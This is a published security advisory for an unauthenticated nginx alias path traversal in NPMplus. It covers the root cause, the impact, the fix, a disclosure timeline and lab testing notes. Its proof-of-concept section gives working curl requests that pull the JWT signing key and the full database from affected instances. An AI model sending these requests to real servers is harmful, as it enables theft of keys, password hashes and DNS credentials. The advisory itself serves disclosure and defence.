# NPMplus — unauthenticated nginx alias off-by-slash path traversal

A single unauthenticated `GET` reads the backend JWT signing key, the whole application database, and stored DNS-provider credentials.

|  |  |
|---|---|
| **CVE ID** | **Pending** — requested via GitHub's CNA when the advisory was published; not yet assigned as of 2026-07-23 |
| **Advisory** | [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r) (published 2026-07-23) |
| **Product** | [ZoeyVid/NPMplus](https://github.com/ZoeyVid/NPMplus) — an nginx-proxy-manager fork |
| **Type** | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
| **Affected** | `2025-12-29-b1` ≤ version < `2026-07-23-r1` |
| **Fixed in** | `2026-07-23-r1` |
| **Severity** | Critical — CVSS 3.1 **10.0** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`), as scored by the maintainer in the published advisory. See [Scoring](#scoring) for the more conservative 9.3 I argued in my report. |
| **Disclosed** | 2026-07-23 (GitHub Security Advisory) |
| **Reporter** | Lyris Vale ([@ValeLyris](https://github.com/ValeLyris)) |

> [!NOTE]
> **CVE number pending.** The maintainer requested a CVE through GitHub when publishing the advisory; as of 2026-07-23 GitHub's CNA has not yet assigned the identifier. This page will be updated once it is issued.

## Summary

NPMplus ships an nginx configuration that serves its local gravatar cache with an off-by-slash `location`/`alias` mismatch and **no authentication**. An unauthenticated remote attacker can read **any file under `/data/npmplus/`** with a single request:

```
GET /images/gravatar../<file>
```

That directory holds the application's secrets — the backend **JWT signing key** (`keys.json`), the entire **application database** (`database.sqlite`, containing admin bcrypt password hashes), and, on any deployment that uses DNS-01 certificates, the **DNS-provider API credentials in plaintext**. Reproduced at runtime on the official container image and independently on stock nginx 1.24.

## Root cause

As shipped (`rootfs/usr/local/nginx/conf/conf.d/npmplus.conf`, admin UI on `0.0.0.0:81 ssl`):

```nginx
location /images/gravatar {        # no trailing slash
    more_set_headers "...";
    alias /data/npmplus/gravatar/; # trailing slash
}
```

This is the classic nginx off-by-slash `alias` trap. With a `location` that has no trailing slash but an `alias` that does, nginx builds the served path as `alias + (uri − location)`:

```
GET /images/gravatar../keys.json
  → /data/npmplus/gravatar/  +  ../keys.json
  → /data/npmplus/keys.json
```

The segment `gravatar..` is not a pure `..` segment, so nginx's URI normalisation does not collapse it; the `../` is applied *after* the alias join, escaping one directory level out of the gravatar cache and into `/data/npmplus/`.

Why it is reliably unauthenticated:

- The `/images/gravatar` block is served directly by nginx as static content — there is no `auth_request` / `internal` / `satisfy` / `deny` on it or on the surrounding `server`. Only `location /api` is proxied to the authenticated backend.
- `start.sh` runs `mkdir -vp /data/npmplus/gravatar` on every boot, so the alias directory always exists and the `../` always resolves.
- The high-value files sit exactly one level up, so a single traversal reaches all of them. Deeper attempts (`../../etc/passwd`, `..%2f…`) are collapsed to 404, but one level is enough.

A second instance of the same bug class exists in `backend/templates/proxy_host.conf` (an Anubis static `alias`), reachable on any proxy host that has Anubis enabled. I identified that one by config review and did **not** separately exploit it in the lab; the maintainer applied the same trailing-slash fix there in `2026-07-23-r1`.

**Not affected:** upstream `jc21/nginx-proxy-manager` links avatars straight to gravatar.com and ships no local `/images/gravatar` alias. This is specific to NPMplus's gravatar-cache feature.

## Impact

A single unauthenticated `GET`, no credentials, discloses the `/data/npmplus/` subtree:

- **`keys.json`** — the RSA key pair used to sign and verify auth JWTs. Leaking the private half breaks the integrity root of trust for every token verified against its public half.
- **`database.sqlite`** — the whole application database: admin email/roles and **bcrypt (cost 13)** password hashes.
- **DNS-provider API credentials in plaintext** — when an operator configures a DNS-01 certificate (normal usage), NPMplus stores the provider credential in `certificate.meta` as cleartext. Confirmed end to end: after an authenticated admin created a DNS-01 certificate with a placeholder token, an *unauthenticated* re-read of the DB returned the token in cleartext. A real deployment's token gives an attacker control of the victim's DNS-provider account → rogue certificate issuance and control over the victim's domains, with no cracking or forging required.

**Not claimed:** session forgery, auth bypass, and RCE via the leaked JWT key are *not* claimed. The release image signs its `__Host-Http-token` cookie with a per-process random secret (`cookieParser(process.env.COOKIE_SECRET || crypto.randomBytes(16)…)`), so the JWT key alone does not yield a usable session unless the operator set a weak or known `COOKIE_SECRET`. Offline cracking of the bcrypt (cost 13) hashes is likewise not assumed.

## Proof of concept

> [!NOTE]
> The maintainer published my full report — this PoC and all eight evidence screenshots included — in the advisory itself, after the fix had shipped. Nothing on this page is disclosed ahead of upstream.

Full script in [`poc/poc.sh`](./poc/poc.sh). All requests carry no cookie or token. Note `--path-as-is` — curl and browsers otherwise fold `gravatar../` back to `/images/`.

```bash
# steal the JWT signing private key
curl -sk --path-as-is 'https://<HOST>:8081/images/gravatar../keys.json'
#   → 200  {"key":"-----BEGIN PRIVATE KEY-----\nMIIE...","pub":"..."}

# exfiltrate the whole database
curl -sk --path-as-is 'https://<HOST>:8081/images/gravatar../database.sqlite' -o database.sqlite
#   → 200, ~110 KB SQLite; admin hashes + certificate.meta (DNS token in cleartext)

# control: the alias root is not directory-listable, proving traversal (not public exposure)
curl -sk -o /dev/null -w '%{http_code}\n' 'https://<HOST>:8081/images/gravatar/'   # → 403
```

Confirmed on the affected build `2026-07-15-r1` of `ghcr.io/zoeyvid/npmplus` — the UI reports its version string as `2026-07-15-r1-f8f7cd0-2.15.1` (app version 2.15.1), which sits inside the affected range above — running container `nginx/1.31.3`, and independently on stock `nginx/1.24.0` with the exact config lines.

## Evidence

All requests unauthenticated (no cookie or token). Click any screenshot for full resolution.

**1 — NPMplus login page (the unauthenticated surface)**

[![The NPMplus login form served over HTTPS on port 8081, with no session established](./evidence/01-login-page-unauth.png)](./evidence/01-login-page-unauth.png)

**2 — Unauthenticated traversal reads the JWT signing private key (`keys.json`) in Burp, no cookie**

[![Burp Repeater: GET /images/gravatar../keys.json with no Cookie header returns 200 and a PEM-encoded private key](./evidence/02-burp-unauth-traversal-keys.json-privatekey.png)](./evidence/02-burp-unauth-traversal-keys.json-privatekey.png)

**3 — Unauthenticated traversal downloads `database.sqlite` (200, 110592 bytes)**

[![Burp Repeater: GET /images/gravatar../database.sqlite with no Cookie header returns 200 and a 110592-byte SQLite file](./evidence/03-burp-unauth-traversal-database.sqlite-200-110592.png)](./evidence/03-burp-unauth-traversal-database.sqlite-200-110592.png)

**4 — The retrieved DB's `user` table (admin)**

[![The user table from the downloaded database, showing the administrator account's email address and roles](./evidence/04-stolen-db-user-table-admin.png)](./evidence/04-stolen-db-user-table-admin.png)

**5 — The retrieved DB's `auth` table (bcrypt cost-13 hash)**

[![The auth table from the downloaded database, showing a bcrypt cost-13 password hash beginning $2b$13$](./evidence/05-stolen-db-auth-table-bcrypt-hash.png)](./evidence/05-stolen-db-auth-table-bcrypt-hash.png)

**6 — Control: `/images/gravatar/` → 403 (normal cache dir, not listable)**

[![Requesting the gravatar directory itself returns 403 Forbidden, showing the alias root is not directory-listable](./evidence/06-contrast-normal-gravatar-dir-403.png)](./evidence/06-contrast-normal-gravatar-dir-403.png)

**7 — Control: direct `/keys.json` → SPA HTML, not the key (proves traversal, not public exposure)**

[![Requesting /keys.json directly returns the frontend single-page-app HTML rather than the key file, proving the disclosure comes from traversal and not from public exposure](./evidence/07-contrast-direct-keys.json-spa-html.png)](./evidence/07-contrast-direct-keys.json-spa-html.png)

**8 — The `certificate` table from the unauthenticated download, DNS-provider token in cleartext (placeholder token used in the lab)**

[![The certificate table from the downloaded database, its meta column holding the DNS-provider API token in cleartext](./evidence/08-database-dns-cred.png)](./evidence/08-database-dns-cred.png)

## Remediation

Fixed in `2026-07-23-r1`. Align the `location` and `alias` trailing slashes and anchor the prefix so the alias root cannot be escaped:

```nginx
location ^~ /images/gravatar/ { alias /data/npmplus/gravatar/; }
```

Defence in depth: mark the static avatar location `internal;`, or do not co-locate secrets (`keys.json`, `database.sqlite`) in a directory whose child is web-served. The same trailing-slash fix applies to the Anubis `alias` in `backend/templates/proxy_host.conf`.

### If you ran an affected build

The admin UI reports a compound string like `2026-07-15-r1-f8f7cd0-2.15.1`. Only the leading date-tag is what the affected range refers to; the trailing `2.15.1` is the app version and does not track it. Anything from `2025-12-29-b1` up to but not including `2026-07-23-r1` is affected.

To test the instance in front of you — the PoC's first request, with the body discarded:

```bash
curl -sk -o /dev/null -w '%{http_code}\n' --path-as-is \
  'https://<YOUR-HOST>:81/images/gravatar../keys.json'
```

`404` — patched, or never affected. `200` — the backend's JWT signing key is being served to anyone who asks. [`poc/poc.sh`](./poc/poc.sh) answers the same question by content rather than by status code.

Updating closes the read; it does not undo one. The read needed no directory listing — the alias root returns 403, as control 6 shows — but the filenames under `/data/npmplus/` are fixed and public in the repository, so guessing them was never a barrier. After updating to `2026-07-23-r1`:

- **The DNS-provider API token**, on DNS-01 deployments — revoke and reissue it at the provider. It is stored in `certificate.meta` in cleartext, it was readable for the whole window, and it is the only leaked credential that keeps working after you patch. Check your CT logs for certificates you did not request.
- **Every NPMplus account password** — the bcrypt cost-13 hashes were readable. Cost 13 buys time against a weak password; it does not buy immunity.
- **The JWT key pair** (`keys.json`) — rotate it.

## Scoring

The published advisory carries **CVSS 3.1 10.0** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`), set by the maintainer. My own report scored it more conservatively at **9.3** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`) — `I:L` for the ability to issue rogue certificates / alter DNS via the leaked provider credential, rather than `I:H`. Either way, the read primitive alone is a High (floor 7.5, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`); the credential disclosure that crosses into a separate security authority (the victim's DNS provider) is what makes Scope **Changed**.

## Disclosure timeline

All on 2026-07-23:

| Date | Event |
|---|---|
| 2026-07-23 | Reported privately to the maintainer. |
| 2026-07-23 | Maintainer accepted, released the fix `2026-07-23-r1`, and published [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r). |
| 2026-07-23 | Maintainer opened discussions [#3626](https://github.com/ZoeyVid/NPMplus/discussions/3626) (explaining the issue) and [#3627](https://github.com/ZoeyVid/NPMplus/discussions/3627) ("2026-07-23-r1 — UPDATE ASAP"). |
| 2026-07-23 | Reporter credit accepted; CVE requested via GitHub, still pending. |

## Scope & testing notes

All testing was on instances fully under my control — a self-hosted NPMplus container and a local stock-nginx reproduction. No production, third-party, or internet-facing instance was accessed, fingerprinted, or scanned. The only account was a self-created test admin; the DNS-01 certificate used a placeholder token, so no real DNS-provider account was contacted. Read-only unauthenticated `GET`s only — no writes, deletes, brute force, or DoS. The lab secrets visible in the screenshots are disposable and were destroyed after testing.

---
[← All advisories](../README.md) · Lyris Vale ([@ValeLyris](https://github.com/ValeLyris))
